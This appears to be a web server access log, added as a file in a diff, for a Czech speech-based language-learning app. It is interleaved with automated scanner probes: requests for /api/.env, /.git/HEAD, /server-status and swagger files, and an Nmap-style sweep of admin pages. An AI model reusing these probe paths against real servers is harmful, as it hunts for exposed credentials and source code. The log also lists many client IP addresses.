+INFO:     195.184.76.145:59695 - "GET / HTTP/1.1" 200 OK
+INFO:     20.171.207.173:0 - "GET /api/landing-page-skills/ HTTP/1.0" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     91.230.168.246:45775 - "GET /app.ico HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     91.196.152.48:35241 - "GET / HTTP/1.1" 200 OK
+INFO:     91.196.152.73:59613 - "GET /app.ico HTTP/1.1" 200 OK
+INFO:     205.210.31.13:62500 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     205.210.31.67:62682 - "GET / HTTP/1.1" 200 OK
+INFO:     45.156.128.168:0 - "GET /api/session/properties HTTP/1.0" 404 Not Found
+INFO:     185.91.127.107:60184 - "GET /json HTTP/1.1" 200 OK
+INFO:     185.91.127.107:60212 - "GET /json HTTP/1.1" 200 OK
+INFO:     185.91.127.107:60240 - "GET /json HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     3.149.59.26:56080 - "GET / HTTP/1.1" 200 OK
+INFO:     3.149.59.26:34032 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     78.153.140.203:0 - "GET /api/.env HTTP/1.0" 404 Not Found
+INFO:     72.177.137.177:53662 - "GET /status HTTP/1.1" 200 OK
+INFO:     72.177.137.177:53662 - "GET /stat HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     65.49.1.66:59632 - "GET / HTTP/1.1" 200 OK
+INFO:     65.49.1.70:54267 - "GET /favicon.ico HTTP/1.1" 200 OK
+INFO:     65.49.1.68:22203 - "GET /?format=json HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     198.235.24.94:58918 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     199.45.154.138:40886 - "GET / HTTP/1.1" 200 OK
+INFO:     199.45.154.138:44502 - "GET / HTTP/1.1" 200 OK
+INFO:     199.45.154.138:44522 - "GET /./app.ico HTTP/1.1" 200 OK
+INFO:     199.45.154.138:44538 - "GET /favicon.ico HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     199.45.154.138:52342 - "GET /./app.ico HTTP/1.1" 200 OK
+INFO:     199.45.154.138:52348 - "GET /favicon.ico HTTP/1.1" 200 OK
+INFO:     199.45.154.138:52352 - "GET /.well-known/security.txt HTTP/1.1" 200 OK
+INFO:     38.46.220.181:0 - "GET /api/swagger.json HTTP/1.0" 404 Not Found
+INFO:     38.46.220.181:0 - "GET /api/swagger.yaml HTTP/1.0" 404 Not Found
+INFO:     38.46.220.181:0 - "GET /api/swagger.yml HTTP/1.0" 404 Not Found
+INFO:     38.46.220.181:0 - "GET /api/v1/swagger.json HTTP/1.0" 404 Not Found
+INFO:     38.46.220.181:0 - "GET /api/v2/swagger.json HTTP/1.0" 404 Not Found
+INFO:     38.46.220.181:0 - "GET /api/swagger.json HTTP/1.0" 404 Not Found
+INFO:     38.46.220.181:0 - "GET /api/swagger.yaml HTTP/1.0" 404 Not Found
+INFO:     38.46.220.181:0 - "GET /api/swagger.yml HTTP/1.0" 404 Not Found
+INFO:     38.46.220.181:0 - "GET /api/documentation.json HTTP/1.0" 404 Not Found
+INFO:     38.46.220.181:0 - "GET /api/v1/swagger.json HTTP/1.0" 404 Not Found
+INFO:     38.46.220.181:0 - "GET /api/v2/swagger.json HTTP/1.0" 404 Not Found
+INFO:     38.46.220.181:0 - "GET /api/documentation.json HTTP/1.0" 404 Not Found
+INFO:     38.46.220.181:0 - "GET /api/config.js HTTP/1.0" 404 Not Found
+INFO:     38.46.220.181:0 - "GET /api/config.js HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     198.235.24.182:62238 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     68.183.94.208:33828 - "GET / HTTP/1.1" 200 OK
+INFO:     68.183.94.208:33844 - "GET /login HTTP/1.1" 200 OK
+INFO:     50.17.76.37:0 - "GET /api/landing-page-skills/ HTTP/1.0" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     205.210.31.104:61876 - "GET / HTTP/1.1" 200 OK
+INFO:     64.62.197.212:26058 - "GET / HTTP/1.1" 200 OK
+INFO:     64.62.197.222:33295 - "GET /favicon.ico HTTP/1.1" 200 OK
+INFO:     64.62.197.215:53325 - "GET /?format=json HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     205.210.31.133:64954 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     200.39.49.32:31400 - "GET / HTTP/1.0" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     167.94.146.58:41180 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.146.58:33822 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.146.58:33836 - "GET /./app.ico HTTP/1.1" 200 OK
+INFO:     167.94.146.58:33840 - "GET /favicon.ico HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     167.94.146.58:58420 - "GET /./app.ico HTTP/1.1" 200 OK
+INFO:     167.94.146.58:58450 - "GET /favicon.ico HTTP/1.1" 200 OK
+INFO:     167.94.146.58:58482 - "GET /robots.txt HTTP/1.1" 200 OK
+INFO:     206.168.34.44:44350 - "GET / HTTP/1.1" 200 OK
+INFO:     206.168.34.44:45816 - "GET / HTTP/1.1" 200 OK
+INFO:     206.168.34.44:45824 - "GET /./app.ico HTTP/1.1" 200 OK
+INFO:     206.168.34.44:45838 - "GET /favicon.ico HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     206.168.34.44:54288 - "GET /./app.ico HTTP/1.1" 200 OK
+INFO:     206.168.34.44:54354 - "GET /favicon.ico HTTP/1.1" 200 OK
+INFO:     206.168.34.44:54356 - "GET /robots.txt HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     206.168.34.34:57706 - "GET / HTTP/1.1" 200 OK
+INFO:     206.168.34.34:36652 - "GET / HTTP/1.1" 200 OK
+INFO:     206.168.34.34:36680 - "GET /./app.ico HTTP/1.1" 200 OK
+INFO:     206.168.34.34:36688 - "GET /favicon.ico HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     206.168.34.34:44272 - "GET /./app.ico HTTP/1.1" 200 OK
+INFO:     206.168.34.34:44298 - "GET /favicon.ico HTTP/1.1" 200 OK
+INFO:     206.168.34.34:44324 - "GET /robots.txt HTTP/1.1" 200 OK
+INFO:     3.132.23.201:36020 - "GET / HTTP/1.1" 200 OK
+INFO:     3.132.23.201:46254 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     87.244.221.32:0 - "GET /api/landing-page-skills/ HTTP/1.0" 200 OK
+INFO:     87.244.221.32:0 - "GET /api/skill/65/ HTTP/1.0" 200 OK
+With count None
+Skill ids [65, 55, 55]
+With count None
+Skill ids [65, 61, 61]
+With count None
+Skill ids [65, 69, 69]
+With count None
+Skill ids [65, 69, 69, 71]
+With count None
+Skill ids [65, 69, 69, 80]
+With count None
+Skill ids [65, 69, 69, 81]
+With count None
+Skill ids [65, 69, 69, 82]
+With count None
+Skill ids [65, 69, 69, 87]
+With count None
+Skill ids [65, 69, 69, 88]
+With count None
+Skill ids [65, 69, 69, 94]
+With count None
+Skill ids [65, 69, 69, 95]
+With count None
+Skill ids [65, 72, 72]
+With count None
+Skill ids [65, 72, 72, 83]
+With count None
+Skill ids [65, 75, 75]
+INFO:     87.244.221.32:0 - "GET /api/skills/65/tree/related HTTP/1.0" 200 OK
+INFO:     87.244.221.32:0 - "GET /api/examples/?topics=%5B65%2C69%2C71%5D HTTP/1.0" 200 OK
+INFO:     87.244.221.32:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     ('87.244.221.32', 0) - "WebSocket /ws/speech/" [accepted]
+INFO:     connection open
+Language changed to: cs-CZ
+INFO:     87.244.221.32:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     87.244.221.32:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     87.244.221.32:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     87.244.221.32:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     connection closed
+WARNING:  Invalid HTTP request received.
+Speech recognition stopped.
+INFO:     147.185.132.60:64140 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     172.105.246.139:50146 - "GET / HTTP/1.0" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     172.105.246.139:50164 - "GET /nice%20ports%2C/Trinity.txt.bak HTTP/1.0" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     172.105.246.139:44624 - "OPTIONS / HTTP/1.0" 200 OK
+INFO:     172.105.246.139:44640 - "OPTIONS / HTTP/1.0" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     172.105.246.139:44756 - "GET /devicedesc.xml HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     172.105.246.139:44792 - "GET / HTTP/1.1" 200 OK
+INFO:     172.105.246.139:44772 - "GET /.git/HEAD HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     172.105.246.139:44874 - "GET /nmaplowercheck1760802166 HTTP/1.1" 200 OK
+INFO:     172.105.246.139:44880 - "GET /Portal0000.htm HTTP/1.1" 200 OK
+INFO:     172.105.246.139:44876 - "GET /CSS/Miniweb.css HTTP/1.1" 200 OK
+INFO:     172.105.246.139:44884 - "GET /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42 HTTP/1.1" 200 OK
+INFO:     172.105.246.139:44900 - "GET /rest/applinks/1.0/manifest HTTP/1.1" 200 OK
+INFO:     172.105.246.139:44902 - "POST /sdk HTTP/1.1" 403 Forbidden
+INFO:     172.105.246.139:44926 - "GET /menu.html HTTP/1.1" 200 OK
+INFO:     172.105.246.139:44912 - "GET /NmapUpperCheck1760802166 HTTP/1.1" 200 OK
+INFO:     172.105.246.139:44956 - "GET /server-status HTTP/1.1" 200 OK
+INFO:     172.105.246.139:44940 - "GET /__Additional HTTP/1.1" 200 OK
+INFO:     172.105.246.139:44964 - "GET /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000 HTTP/1.1" 200 OK
+INFO:     172.105.246.139:44972 - "GET /base.aspx HTTP/1.1" 200 OK
+INFO:     172.105.246.139:44986 - "GET /XSEl HTTP/1.1" 200 OK
+INFO:     172.105.246.139:44968 - "GET /Nmap/folder/check1760802166 HTTP/1.1" 200 OK
+INFO:     172.105.246.139:44998 - "GET / HTTP/1.1" 200 OK
+INFO:     172.105.246.139:45012 - "GET /menu.cgi HTTP/1.1" 200 OK
+INFO:     172.105.246.139:45018 - "GET /favicon.ico HTTP/1.1" 200 OK
+INFO:     172.105.246.139:45024 - "GET / HTTP/1.1" 200 OK
+INFO:     172.105.246.139:45048 - "GET /Portal/Portal.mwsl HTTP/1.1" 200 OK
+INFO:     172.105.246.139:45032 - "GET /base.inc HTTP/1.1" 200 OK
+INFO:     172.105.246.139:45066 - "GET /docs/cplugError.html/ HTTP/1.1" 200 OK
+INFO:     172.105.246.139:45062 - "GET /inicio.cfm HTTP/1.1" 200 OK
+INFO:     172.105.246.139:45076 - "GET /home.aspx HTTP/1.1" 200 OK
+INFO:     172.105.246.139:45084 - "GET /indice.cgi HTTP/1.1" 200 OK
+INFO:     172.105.246.139:45088 - "GET /robots.txt HTTP/1.1" 200 OK
+INFO:     172.105.246.139:45096 - "GET /index.pl HTTP/1.1" 200 OK
+INFO:     172.105.246.139:45110 - "GET /main.jhtml HTTP/1.1" 200 OK
+INFO:     172.105.246.139:45120 - "GET /menu.pl HTTP/1.1" 200 OK
+INFO:     172.105.246.139:45136 - "GET /admin.pl HTTP/1.1" 200 OK
+INFO:     172.105.246.139:45138 - "GET /admin.cfm HTTP/1.1" 200 OK
+INFO:     172.105.246.139:45146 - "GET /inicio.pl HTTP/1.1" 200 OK
+INFO:     172.105.246.139:45160 - "GET /base.asp HTTP/1.1" 200 OK
+INFO:     172.105.246.139:45162 - "GET /base.html HTTP/1.1" 200 OK
+INFO:     172.105.246.139:45178 - "GET /localstart.asp HTTP/1.1" 200 OK
+INFO:     172.105.246.139:45180 - "GET /index.aspx HTTP/1.1" 200 OK
+INFO:     172.105.246.139:45188 - "GET /main.pl HTTP/1.1" 200 OK
+INFO:     172.105.246.139:45202 - "GET /start.html HTTP/1.1" 200 OK
+INFO:     172.105.246.139:45216 - "GET /localstart.cgi HTTP/1.1" 200 OK
+INFO:     172.105.246.139:45232 - "GET /start.shtml HTTP/1.1" 200 OK
+INFO:     172.105.246.139:45248 - "GET /home.pl HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60238 - "GET /admin.shtml HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60246 - "GET /inicio.jsa HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60250 - "GET /indice.cfm HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60254 - "GET /main.asp HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60268 - "GET /index.php HTTP/1.1" 200 OK
+INFO:     172.105.246.139:44778 - "GET / HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60276 - "GET /indice.php HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60282 - "GET /admin.php HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60284 - "GET /default.aspx HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60298 - "GET /home.php HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60308 - "GET /main.jsa HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60320 - "GET /index.jsa HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60332 - "GET /menu.asp HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60344 - "GET /admin.jsp HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60356 - "GET /indice.jhtml HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60362 - "GET /admin.jsa HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60370 - "GET /base.jsa HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60372 - "GET /base.jhtml HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60380 - "GET /menu.cfm HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60384 - "GET /main.cgi HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60386 - "GET /start.cfm HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60402 - "GET /index.shtml HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60404 - "GET /start.jsa HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60410 - "GET /admin.html HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60424 - "GET /main.php HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60436 - "GET /menu.aspx HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60446 - "GET /default.pl HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60450 - "GET /base.php HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60460 - "GET /inicio.jhtml HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60464 - "GET /start.php HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60472 - "GET /admin.asp HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     172.105.246.139:60488 - "GET /base.shtml HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60490 - "GET /default.jsp HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60498 - "GET /admin.cgi HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60508 - "GET /admin.aspx HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60510 - "GET /default.php HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60520 - "GET /index.html HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60522 - "GET /base.pl HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60532 - "GET /home.asp HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     172.105.246.139:60558 - "GET /index.cfm HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60568 - "GET /base.jsp HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60578 - "GET /localstart.pl HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60592 - "GET /base.cgi HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60600 - "GET /home.html HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60610 - "GET /main.jsp HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60624 - "GET /default.shtml HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60634 - "GET /start.jsp HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60650 - "GET /indice.shtml HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60666 - "GET /default.html HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60674 - "GET /default.cgi HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60690 - "GET /indice.pl HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60692 - "GET /inicio.cgi HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60696 - "GET /indice.jsp HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60704 - "GET /indice.jsa HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60706 - "GET /indice.html HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60712 - "GET /menu.shtml HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60722 - "GET /indice.aspx HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60732 - "GET /indice.asp HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60748 - "GET /inicio.jsp HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60760 - "GET /start.asp HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60772 - "GET /main.html HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60782 - "GET /menu.jhtml HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60792 - "GET /default.asp HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60798 - "GET /inicio.shtml HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60802 - "GET /inicio.php HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60808 - "GET /default.jsa HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60810 - "GET /home.cfm HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60826 - "GET /index.cgi HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60834 - "GET /localstart.html HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60842 - "GET /inicio.html HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60854 - "GET /inicio.aspx HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60858 - "GET /inicio.asp HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60874 - "GET /index.jsp HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60888 - "GET /localstart.shtml HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60898 - "GET /localstart.php HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60904 - "GET /localstart.jsp HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60912 - "GET /main.cfm HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60924 - "GET /menu.php HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60940 - "GET /localstart.jhtml HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60954 - "GET /localstart.cfm HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60966 - "GET /localstart.aspx HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60970 - "GET /main.aspx HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60978 - "GET /readme.txt HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60994 - "GET /start.pl HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60996 - "GET /index.jhtml HTTP/1.1" 200 OK
+INFO:     172.105.246.139:60998 - "GET /home.cgi HTTP/1.1" 200 OK
+INFO:     172.105.246.139:33580 - "GET /menu.jsp HTTP/1.1" 200 OK
+INFO:     172.105.246.139:33592 - "GET /start.jhtml HTTP/1.1" 200 OK
+INFO:     172.105.246.139:33602 - "GET /default.cfm HTTP/1.1" 200 OK
+INFO:     172.105.246.139:33614 - "GET /home.jhtml HTTP/1.1" 200 OK
+INFO:     172.105.246.139:33616 - "GET /start.cgi HTTP/1.1" 200 OK
+INFO:     172.105.246.139:33628 - "GET /index.asp HTTP/1.1" 200 OK
+INFO:     172.105.246.139:33632 - "GET /admin.jhtml HTTP/1.1" 200 OK
+INFO:     172.105.246.139:33646 - "GET /start.aspx HTTP/1.1" 200 OK
+INFO:     172.105.246.139:33656 - "GET /main.shtml HTTP/1.1" 200 OK
+INFO:     172.105.246.139:33660 - "GET /base.cfm HTTP/1.1" 200 OK
+INFO:     172.105.246.139:33662 - "GET /home.shtml HTTP/1.1" 200 OK
+INFO:     172.105.246.139:33670 - "GET /home.jsp HTTP/1.1" 200 OK
+INFO:     172.105.246.139:33674 - "GET /menu.jsa HTTP/1.1" 200 OK
+INFO:     172.105.246.139:33676 - "GET /default.jhtml HTTP/1.1" 200 OK
+INFO:     172.105.246.139:33688 - "GET /home.jsa HTTP/1.1" 200 OK
+INFO:     172.105.246.139:33700 - "GET /localstart.jsa HTTP/1.1" 200 OK
+INFO:     172.105.246.139:33714 - "GET / HTTP/1.1" 200 OK
+INFO:     87.244.221.32:0 - "GET /api/examples/?topics=%5B65%2C69%2C71%5D HTTP/1.0" 200 OK
+INFO:     87.244.221.32:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     85.237.234.38:0 - "GET /api/landing-page-skills/ HTTP/1.0" 200 OK
+INFO:     85.237.234.38:0 - "GET /api/skill/65/ HTTP/1.0" 200 OK
+With count None
+Skill ids [65, 55, 55]
+With count None
+Skill ids [65, 61, 61]
+With count None
+Skill ids [65, 69, 69]
+With count None
+Skill ids [65, 69, 69, 71]
+With count None
+Skill ids [65, 69, 69, 80]
+With count None
+Skill ids [65, 69, 69, 81]
+With count None
+Skill ids [65, 69, 69, 82]
+With count None
+Skill ids [65, 69, 69, 87]
+With count None
+Skill ids [65, 69, 69, 88]
+With count None
+Skill ids [65, 69, 69, 94]
+With count None
+Skill ids [65, 69, 69, 95]
+With count None
+Skill ids [65, 72, 72]
+With count None
+Skill ids [65, 72, 72, 83]
+With count None
+Skill ids [65, 75, 75]
+INFO:     85.237.234.38:0 - "GET /api/skills/65/tree/related HTTP/1.0" 200 OK
+INFO:     85.237.234.97:0 - "GET /api/landing-page-skills/ HTTP/1.0" 200 OK
+INFO:     85.237.234.97:0 - "GET /api/skill/65/ HTTP/1.0" 200 OK
+With count None
+Skill ids [65, 55, 55]
+With count None
+Skill ids [65, 61, 61]
+With count None
+Skill ids [65, 69, 69]
+With count None
+Skill ids [65, 69, 69, 71]
+With count None
+Skill ids [65, 69, 69, 80]
+With count None
+Skill ids [65, 69, 69, 81]
+With count None
+Skill ids [65, 69, 69, 82]
+With count None
+Skill ids [65, 69, 69, 87]
+With count None
+Skill ids [65, 69, 69, 88]
+With count None
+Skill ids [65, 69, 69, 94]
+With count None
+Skill ids [65, 69, 69, 95]
+With count None
+Skill ids [65, 72, 72]
+With count None
+Skill ids [65, 72, 72, 83]
+With count None
+Skill ids [65, 75, 75]
+INFO:     85.237.234.97:0 - "GET /api/skills/65/tree/related HTTP/1.0" 200 OK
+INFO:     85.237.234.38:0 - "GET /api/skill/66/ HTTP/1.0" 200 OK
+With count None
+Skill ids [66, 55, 55]
+With count None
+Skill ids [66, 61, 61]
+With count None
+Skill ids [66, 69, 69]
+With count None
+Skill ids [66, 69, 69, 71]
+With count None
+Skill ids [66, 69, 69, 80]
+With count None
+Skill ids [66, 69, 69, 81]
+With count None
+Skill ids [66, 69, 69, 82]
+With count None
+Skill ids [66, 69, 69, 87]
+With count None
+Skill ids [66, 69, 69, 88]
+With count None
+Skill ids [66, 69, 69, 94]
+With count None
+Skill ids [66, 69, 69, 95]
+With count None
+Skill ids [66, 72, 72]
+With count None
+Skill ids [66, 75, 75]
+INFO:     85.237.234.38:0 - "GET /api/skills/66/tree/related HTTP/1.0" 200 OK
+INFO:     85.237.234.97:0 - "GET /api/examples/?topics=%5B65%2C69%2C87%5D HTTP/1.0" 200 OK
+INFO:     85.237.234.97:0 - "OPTIONS /api/create-record/ HTTP/1.0" 200 OK
+INFO:     85.237.234.97:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     85.237.234.38:0 - "GET /api/examples/?topics=%5B66%2C69%2C80%5D HTTP/1.0" 200 OK
+INFO:     85.237.234.38:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     85.237.234.227:0 - "GET /api/landing-page-skills/ HTTP/1.0" 200 OK
+INFO:     46.229.224.4:0 - "GET /api/landing-page-skills/ HTTP/1.0" 200 OK
+INFO:     ('85.237.234.38', 0) - "WebSocket /ws/speech/" [accepted]
+INFO:     connection open
+INFO:     connection closed
+INFO:     ('85.237.234.38', 0) - "WebSocket /ws/speech/" [accepted]
+INFO:     connection closed
+Language changed to: cs-CZ
+Speech recognition stopped.
+Speech recognition stopped.
+INFO:     85.237.234.38:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     ('85.237.234.38', 0) - "WebSocket /ws/speech/" [accepted]
+INFO:     connection open
+Language changed to: cs-CZ
+INFO:     85.237.234.38:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     85.237.234.38:0 - "POST /api/skip-example/ HTTP/1.0" 200 OK
+INFO:     85.237.234.38:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     connection closed
+INFO:     ('85.237.234.97', 0) - "WebSocket /ws/speech/" [accepted]
+INFO:     connection closed
+INFO:     ('158.255.24.129', 0) - "WebSocket /ws/speech/" [accepted]
+INFO:     connection open
+INFO:     connection closed
+INFO:     ('158.255.24.129', 0) - "WebSocket /ws/speech/" [accepted]
+INFO:     connection open
+Speech recognition stopped.
+Speech recognition stopped.
+Language changed to: cs-CZ
+Speech recognition stopped.
+INFO:     85.237.234.227:0 - "GET /api/skill/72/ HTTP/1.0" 200 OK
+With count False
+Skill ids [83]
+INFO:     85.237.234.227:0 - "GET /api/skills/72/tree/children?with_counts=false HTTP/1.0" 200 OK
+INFO:     85.237.234.227:0 - "GET /api/skills/72/operations HTTP/1.0" 200 OK
+INFO:     85.237.234.227:0 - "GET /api/examples/?topics=%5B72%2C83%5D HTTP/1.0" 200 OK
+INFO:     85.237.234.227:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     85.237.234.97:0 - "OPTIONS /api/skip-example/ HTTP/1.0" 200 OK
+INFO:     85.237.234.97:0 - "POST /api/skip-example/ HTTP/1.0" 200 OK
+INFO:     85.237.234.97:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     ('85.237.234.227', 0) - "WebSocket /ws/speech/" [accepted]
+INFO:     connection open
+INFO:     connection closed
+INFO:     ('85.237.234.227', 0) - "WebSocket /ws/speech/" [accepted]
+INFO:     connection open
+INFO:     connection closed
+Language changed to: cs-CZ
+Speech recognition stopped.
+Language changed to: cs-CZ
+Speech recognition stopped.
+INFO:     85.237.234.227:0 - "POST /api/check-answer/ HTTP/1.0" 200 OK
+INFO:     ('85.237.234.227', 0) - "WebSocket /ws/speech/" [accepted]
+INFO:     connection open
+Language changed to: cs-CZ
+INFO:     85.237.234.227:0 - "POST /api/check-answer/ HTTP/1.0" 200 OK
+INFO:     85.237.234.227:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     connection closed
